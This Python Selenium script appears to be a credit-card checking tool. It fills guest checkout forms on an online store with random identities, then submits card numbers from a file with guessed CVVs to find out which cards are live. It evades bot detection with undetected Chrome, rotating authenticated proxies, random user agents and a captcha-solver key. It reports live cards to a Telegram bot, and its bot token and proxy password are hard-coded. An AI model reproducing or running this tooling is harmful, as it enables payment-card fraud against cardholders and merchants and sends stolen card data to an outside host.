from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time
import undetected_chromedriver as uc 
import urllib.request
from fake_useragent import UserAgent
import re
import os
import threading
import random
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import TimeoutException, ElementClickInterceptedException

proxy_list = [f"p.webshare.io:{i}" for i in range(10010, 10099)]


target_url = "https://www.swansonvitamins.com/order?"
items_url = "https://shop.uncrate.com/products/jaguar-d-type-print-1"
#PROXY = random.choice(proxy_list)
PROXY = "127.0.0.1:60000"
#PROXY = "92.222.195.176:10000"
TelegramURL = "https://api.telegram.org/bot6996206278:AAGbcKl4naldDIFSr2M1fFIxeviB0E1zFc8/sendMessage?chat_id=-4287406594&text="

RunPath = r'C:\Users\SV-1\Documents\CC Checker'
profile = "Profile 1"
ccFile = RunPath + r'\CCN_3.txt'
ccLive = RunPath + r'\CCLIVE.txt'
#ccInfor = RunPath + r'\CCINFO.txt'
info = RunPath + r'\inforboibest.txt'
extension_path = r'C:\Users\SV-1\GPM\pythonProject2\ProfileChimto\Default\Extensions\dknlfmjaanfblgfdfebhijalfmhmjjjo\0.4.12_0'
dLive = []
i=0
#proxy_list = [f"p.webshare.io:{i}" for i in range(10010, 10099)]


if __name__ == '__main__':      

    with open(info, 'r') as file:
        linesadd = file.readlines()

    with open(ccFile, 'r') as f:
        data = f.read().splitlines()
    dataWrite = data.copy() 
    with open(ccLive, 'r') as f:
        dLive = f.read().splitlines()

    checkerror = True 
    def Replace(xInput):        
        return xInput.replace(" ","")
    
    def checkExists(driver, xpath):
        try:
            driver.find_element(By.XPATH, xpath) 
        except NoSuchElementException:
            return False
        return True
    def Search(sText,inText):
        try:            
            text_found = re.search(sText, inText)             
            if text_found != None:
                 return True
        except NoSuchElementException:
            return False
        return False   
    class ProxyExtension:
        def __init__(self, host, port, username, password):
            self.manifest_json = """
            {
                "version": "1.0.0",
                "manifest_version": 2,
                "name": "Chrome Proxy",
                "permissions": [
                    "proxy",
                    "tabs",
                    "unlimitedStorage",
                    "storage",
                    "<all_urls>",
                    "webRequest",
                    "webRequestBlocking"
                ],
                "background": {"scripts": ["background.js"]},
                "minimum_chrome_version": "76.0.0"
            }
            """
            self.background_js = """
            var config = {
                mode: "fixed_servers",
                rules: {
                    singleProxy: {
                        scheme: "http",
                        host: "%s",
                        port: %d
                    },
                    bypassList: ["localhost"]
                }
            };

            chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

            function callbackFn(details) {
                return {
                    authCredentials: {
                        username: "%s",
                        password: "%s"
                    }
                };
            }

            chrome.webRequest.onAuthRequired.addListener(
                callbackFn,
                { urls: ["<all_urls>"] },
                ['blocking']
            );
            """ % (host, port, username, password)

        def create_extension(self, extension_dir):
            import os
            import json

            if not os.path.exists(extension_dir):
                os.makedirs(extension_dir)

            with open(os.path.join(extension_dir, 'manifest.json'), 'w') as f:
                f.write(self.manifest_json)

            with open(os.path.join(extension_dir, 'background.js'), 'w') as f:
                f.write(self.background_js)


        
    
    
    
    def my_function():
        proxy_host = "all.dc.smartproxy.com"
        proxy_port = "10079"
        proxy_username = "anvv0987"
        proxy_password = "zdXb~6pLpTqB3xP"
        proxy_port = int(proxy_port)
        class ProxyExtension:
            def __init__(self, host, port, username, password):
                self.manifest_json = """
                {
                    "version": "1.0.0",
                    "manifest_version": 2,
                    "name": "Chrome Proxy",
                    "permissions": [
                        "proxy",
                        "tabs",
                        "unlimitedStorage",
                        "storage",
                        "<all_urls>",
                        "webRequest",
                        "webRequestBlocking"
                    ],
                    "background": {"scripts": ["background.js"]},
                    "minimum_chrome_version": "76.0.0"
                }
                """
                self.background_js = """
                var config = {
                    mode: "fixed_servers",
                    rules: {
                        singleProxy: {
                            scheme: "http",
                            host: "%s",
                            port: %d
                        },
                        bypassList: ["localhost"]
                    }
                };

                chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

                function callbackFn(details) {
                    return {
                        authCredentials: {
                            username: "%s",
                            password: "%s"
                        }
                    };
                }

                chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    { urls: ["<all_urls>"] },
                    ['blocking']
                );
                """ % (host, port, username, password)

            def create_extension(self, extension_dir):
                import os
                import json

                if not os.path.exists(extension_dir):
                    os.makedirs(extension_dir)

                with open(os.path.join(extension_dir, 'manifest.json'), 'w') as f:
                    f.write(self.manifest_json)

                with open(os.path.join(extension_dir, 'background.js'), 'w') as f:
                    f.write(self.background_js)


        
    
        extension_dir = os.path.join(os.getcwd(), 'proxy_extension')
        proxy_extension = ProxyExtension(proxy_host, proxy_port, proxy_username, proxy_password)
        proxy_extension.create_extension(extension_dir)
        extension_path_1 = extension_dir
        extension_path_2 = extension_path
        extensions = f"{extension_path_1},{extension_path_2}"
        new_profile_dir = os.path.join(os.getcwd(), f'profile_{int(time.time())}')
        ua = UserAgent()
        #user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        user_agent = ua.random
        chrome_options = Options()
        chrome_options.add_argument("--load-extension=" + extensions)
        chrome_options.add_argument(f'--user-agent={user_agent}')
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--disable-notifications")
        chrome_options.add_argument("--disable-javascript")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")   
        chrome_options.add_argument(f'--user-data-dir={new_profile_dir}')
        #chrome_options.add_argument('--proxy-server=' + PROXY)
        #chrome_options.add_argument(f'--proxy-hoer=socks5://{PROXY}')
        chrome_options.add_argument("--disable-web-security")

        chrome_options.add_argument("--force-device-scale-factor=0.7")
        prefss = {
            "profile.managed_default_content_settings.images": 2,
            "profile.managed_default_content_settings.stylesheets": 2,
            "profile.managed_default_content_settings.javascript": 2
        }
        

        time.sleep(2)
        global i

        print('Running')                
        driver = uc.Chrome(options=chrome_options) 
        driver.set_window_size(900, 1200)
        action = webdriver.ActionChains(driver) 
        #disable image
        driver.get("chrome://settings/content/images")
        

        #add key nopecha
        driver.get("chrome-extension://dknlfmjaanfblgfdfebhijalfmhmjjjo/popup.html")
        time.sleep(1.5)
        driver.refresh()
        
        element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, ".key-icon.font-normal.color-brand"))
        )
        driver.execute_script("document.querySelector('.key-icon.font-normal.color-brand').click();")
        time.sleep(0.5)
        input_element = driver.find_element(By.CLASS_NAME, "key-input")
        input_element.send_keys("sub_1PgTCNCRwBwvt6ptWkJ1KcsP") 
        input_element.send_keys(Keys.ENTER)
        time.sleep(2.5)
        #add cart & guest check out
        try:
            driver.get(items_url)
            
            # Kiểm tra sự tồn tại của thẻ <h1> với văn bản "Sorry, you have been blocked"
            try:
                h1_element = WebDriverWait(driver, 2).until(
                    EC.presence_of_element_located((By.XPATH, "//h1[normalize-space(text())='Pardon Our Interruption']"))
                )
                driver.quit()
                return my_function()
            except TimeoutException:
                print(">>")
            
        except Exception as e:
            print(f"Đã xảy ra lỗi: {e}")
        time.sleep(3) 

        button_element = WebDriverWait(driver, 80).until(
            EC.presence_of_element_located((By.XPATH, "//button[.//span[normalize-space(text())='Add to cart']]"))
        )

        try:
            button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, '//button[@name="add"]'))
            )
            driver.execute_script("arguments[0].scrollIntoView(true);", button)
            WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.XPATH, '//button[@name="add"]')))
            driver.execute_script("arguments[0].click();", button)
        except Exception as e:
            print(f"An error occurred: {e}")
        try:

            checkout_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, '//button[@name="checkout"]'))
            )
            driver.execute_script("arguments[0].scrollIntoView(true);", checkout_button)
            time.sleep(1)
            checkout_button.click()
        except Exception as e:
            print(f"An error occurred: {e}")




        #end add cart
        lineadd = random.choice(linesadd).strip()
        #nhap info check guest
        fname = lineadd.split("|")[0]
        lname = lineadd.split("|")[1]
        phone = lineadd.split("|")[2]
        email = lineadd.split("|")[3]
        address = lineadd.split("|")[4]
        city = lineadd.split("|")[5]
        state = lineadd.split("|")[6]
        zipcode = lineadd.split("|")[7]
        full_name = fname + lname
        try:

            wait = WebDriverWait(driver, 30)
            iemail = WebDriverWait(driver, 50).until(
                EC.visibility_of_element_located((By.NAME, 'email'))
            )
            iemail.click()
            iemail.clear()
            iemail.send_keys(email)
            time.sleep(0.1)
            iphone = driver.find_element(By.NAME, 'phone')
            iphone.click()
            iphone.clear()
            iphone.send_keys(phone)
            time.sleep(0.1)
            ifname = driver.find_element(By.NAME, 'firstName')  
            ifname.click()
            ifname.clear()
            ifname.send_keys(fname)
            time.sleep(0.1)

            ilname = driver.find_element(By.NAME, 'lastName')  
            ilname.click()
            ilname.clear()
            ilname.send_keys(lname)
            time.sleep(0.1)

            iaddress = driver.find_element(By.NAME, 'address1')  
            iaddress.click()
            iaddress.clear()
            iaddress.send_keys(address)
            time.sleep(0.1)
            icity = driver.find_element(By.NAME, 'city')  
            icity.click()
            icity.clear()
            icity.send_keys(city)
            time.sleep(0.1)
            xpath_zip = "/html/body/div[1]/div[1]/div/div[1]/div[2]/div[1]/div/main/div/form/div[1]/div[3]/div/section/div/div[2]/section/div/div/div[1]/div/div/div/div[1]/div[6]/div[3]/div/div/div/input"
            script_zip = """
                        // XPath của phần tử để nhập mã ZIP
                        const xpath_zip = arguments[0];

                        // Hàm tìm phần tử bằng XPath
                        function getElementByXPath(xpath) {
                            const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
                            return result.singleNodeValue;
                        }

                        // Tìm phần tử
                        const element = getElementByXPath(xpath_zip);

                        // Kiểm tra phần tử có tồn tại không
                        if (element) {
                            // Đặt tiêu điểm vào phần tử
                            element.focus();

                            // Xóa nội dung nếu cần
                            element.value = '';

                            // Nhập dữ liệu vào phần tử
                            const zipCode = arguments[1];

                            // Sử dụng setInterval để mô phỏng việc nhập ký tự từng cái một
                            let i = 0;
                            const intervalId = setInterval(() => {
                                if (i < zipCode.length) {
                                    element.value += zipCode[i++];
                                    // Thêm sự kiện để thông báo trình duyệt về việc thay đổi giá trị
                                    const event = new Event('input', { bubbles: true });
                                    element.dispatchEvent(event);
                                } else {
                                    clearInterval(intervalId);
                                }
                            }, 100); // Đợi 100ms giữa các ký tự

                        } else {
                            console.log("Element not found.");
                        }
                    """

                    # Thực thi đoạn JavaScript để nhập mã ZIP
            driver.execute_script(script_zip, xpath_zip, zipcode)
            time.sleep(1.1)

            
            try:
                select_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, 'Select1'))
                )
                select_element.click()
                option_text = "Pennsylvania"
                option_xpath = f"//option[normalize-space(text())='{option_text}']"
                option_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, option_xpath))
                )

                driver.execute_script("arguments[0].scrollIntoView(true);", option_element)
                option_element.click()
                time.sleep(3) 

            except Exception as e:
                print(f"An error occurred: {e}")

        except TimeoutException:
                        print("e")

        check = True
        while True:
            action = ActionChains(driver)
            while i < len(data) :  
                try:

                    line = data[i]           

                    card_number = line.split("|")[0]
                    exp_month = line.split("|")[1]
                    exp_year_full = line.split("|")[2]
                    exp_year = exp_year_full[-2:]
                    #card_ccv = line.split("|")[3]
                    card_ccv = "{:03d}".format(random.randint(0, 999))
                    exp_card = exp_month + exp_year
                    
                    time.sleep(3)
                    try:

                        iframe_element_card = WebDriverWait(driver, 55).until(
                            EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[1]/div/div[1]/div[2]/div[1]/div/main/div/form/div[1]/div[4]/div[1]/div/section/div/div[2]/div/div/div/div/fieldset/div/div[1]/div/div/div/div/div/div/div/div[1]/div/div/div[1]/div/div/div[1]/iframe'))
                        )
                        driver.switch_to.frame(iframe_element_card)
                        #nhap the
                        time.sleep(1)
                        iCardNumber = driver.find_element(By.NAME, "number")
                        iCardNumber.click()
                        iCardNumber.clear()
                        for char in card_number:
                            iCardNumber.send_keys(char)
                            time.sleep(0.1) 
                        driver.switch_to.default_content()
                        #---------------------------------------------#
                        iframe_element_date = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[1]/div/div[1]/div[2]/div[1]/div/main/div/form/div[1]/div[4]/div[1]/div/section/div/div[2]/div/div/div/div/fieldset/div/div[1]/div/div/div/div/div/div/div/div[1]/div/div/div[2]/div[1]/div/div/div/div/iframe'))
                        )
                        driver.switch_to.frame(iframe_element_date)
                        #nhap date
                        iCarddate= driver.find_element(By.NAME, "expiry")
                        iCarddate.click()
                        iCarddate.clear()
                        for char in exp_card:
                            iCarddate.send_keys(char)
                            time.sleep(0.1)
                        driver.switch_to.default_content()
                        #---------------------------------------------#
                        iframe_element_ccv = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[1]/div/div[1]/div[2]/div[1]/div/main/div/form/div[1]/div[4]/div[1]/div/section/div/div[2]/div/div/div/div/fieldset/div/div[1]/div/div/div/div/div/div/div/div[1]/div/div/div[2]/div[2]/div/div/div/div[1]/iframe'))
                        )
                        driver.switch_to.frame(iframe_element_ccv)
                        #nhap ccv
                        iCardCCV = driver.find_element(By.NAME, "verification_value")
                        iCardCCV.click()
                        iCardCCV.clear()
                        for char in card_ccv:
                            iCardCCV.send_keys(char)
                            time.sleep(0.1)
                        driver.switch_to.default_content()
                        #---------------------------------------------#
                        try:
                            # Đợi cho button với id="checkout-pay-button" xuất hiện
                            checkout_button = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located((By.ID, "checkout-pay-button"))
                            )
                            
                            # Cuộn đến phần tử để đảm bảo nó nằm trong khung nhìn
                            driver.execute_script("arguments[0].scrollIntoView(true);", checkout_button)
                            
                            # Đợi một chút để phần tử ổn định
                            WebDriverWait(driver, 1).until(
                                EC.visibility_of(checkout_button)
                            )
                            
                            # Click vào button
                            checkout_button.click()

                        finally:
                            time.sleep(0.1)     
                    finally:
                        # Đóng trình duyệt khi hoàn tất
                        time.sleep(2)
                    time.sleep(8888)
                    check = True                     
                    while check :
                        try : 
                            try : 
                                
                                #order = driver.find_element(By.CLASS_NAME, "Header_content__VVavC")
                                order = driver.find_element(By.XPATH, "//div[normalize-space(text())='View Full Order Details']")
                                urllib.request.urlopen(TelegramURL + line).read()
                                print("LIVE : [" + str(i+1) + "/" + str(len(data)) + "] ", line) 
                                dLive.append(line)
                                try:
                                    dataWrite.remove(line)
                                except:
                                    time.sleep(1)                        
                                time.sleep(3)
                                #end add cart
                                i+=1
                                break
                                
                            except:   
                                
                                xpath_error_card_declined = "//div[normalize-space(text())='Your card was declined. Try again or use a different payment method.']"
                                xpath_error_payment_details = "//div[normalize-space(text())='Your payment details couldn’t be verified. Check your card details and try again.']"
                                if checkExists(driver, xpath_error_card_declined) or checkExists(driver, xpath_error_payment_details):
                                    #back payment
                                    try:
                                        dataWrite.remove(line)
                                    except:
                                        time.sleep(1)
                                    print("Die : [" + str(i+1) + "/" + str(len(data)) + "] ", line) 
                                    i+=1
                                    break
                                else: 
                                    try:
                                        dataWrite.remove(line)
                                        driver.quit()                    
                                        return my_function()
                                        #WebDriverWait(driver, 15).until(EC.title_contains("Checkout"))
                                    except:
                                        try :
                                            dataWrite.remove(line)
                                            driver.quit()    
                                            return my_function()                      
                                        except:
                                            time.sleep(1)   
                                    
                            
                        except:   
                            time.sleep(5)
                        break
                  
                    try:
                        with open(ccFile, 'w') as file:
                            file.writelines(s + '\n' for s in dataWrite)                            
                    except:
                        time.sleep(5) 
                    try:
                        with open(ccLive, 'w') as file:
                            file.writelines(s + '\n' for s in dLive)                            
                    except:
                        time.sleep(5) 
                    
                except:   
                    driver.quit()                    
                    return my_function() 
                break
                    
    value = None

my_function()